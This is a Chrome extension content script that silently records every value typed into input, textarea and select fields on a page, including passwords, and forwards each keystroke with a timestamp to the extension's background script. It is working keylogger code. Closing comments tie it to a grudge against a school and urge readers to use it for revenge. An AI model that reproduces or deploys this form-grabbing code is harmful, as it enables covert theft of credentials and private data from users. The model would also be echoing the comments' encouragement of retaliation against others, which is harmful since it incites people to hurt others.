console.log("Content script loaded!");

// Function to log input data
const logInputData = (input) => {
    let inputType = input.type || input.tagName.toLowerCase();
    let inputName = input.name || inputType;
    let inputValue = input.value || "<input>";  // Handle empty inputs
    let timestamp = new Date().toLocaleString();

    // Check if the input is part of a form
    let formParent = input.closest('form');

    // Log separately if not part of any form
    if (!formParent) {
        inputName = "empty";  // If input is outside form, name it "empty"
    }

    // Log input data to the console
    // console.log(`Input detected: ${inputName}: ${inputValue}`);

    // Send the input data to the background script
    chrome.runtime.sendMessage({
        type: 'inputData',
        data: { name: inputName, value: inputValue, timestamp: timestamp }
    });
};

// Function to monitor and attach listeners to form fields
const monitorFormFields = () => {
    const inputs = document.querySelectorAll('input, textarea, select');

    inputs.forEach(input => {
        if (!input._listenerAttached) {
            console.log(`Adding listeners to ${input.tagName.toLowerCase()} with name "${input.name}" and type "${input.type}"`);

            input.addEventListener('change', () => logInputData(input));
            input.addEventListener('input', () => logInputData(input));

            input._listenerAttached = true;  // Mark that listener is attached
        }
    });
};

// Initial form monitoring on page load
monitorFormFields();

// Use MutationObserver to detect dynamic form additions
const observer = new MutationObserver((mutations) => {
    mutations.forEach(mutation => {
        if (mutation.addedNodes.length) {
            console.log('DOM changed, checking for new form fields...');
            monitorFormFields();  // Re-check for new form fields and attach listeners
        }
    });
});

// Start observing the body for changes in the DOM
observer.observe(document.body, { childList: true, subtree: true });


// Note: This school sucks.
// If you're reading this from github, have fun! Hopefully you will get your revenge as well from whoever hurt you as well, whether directly or indirectly. It is your right to take revenge from those oppressors who transgress beyond bounds and cause mischief in the lands. They will soon see who is the greater, and who is the lesser.
// Perhaps this program will help you, with the help of Allah. He helps whoever he wishes; he is mighty and merciful!
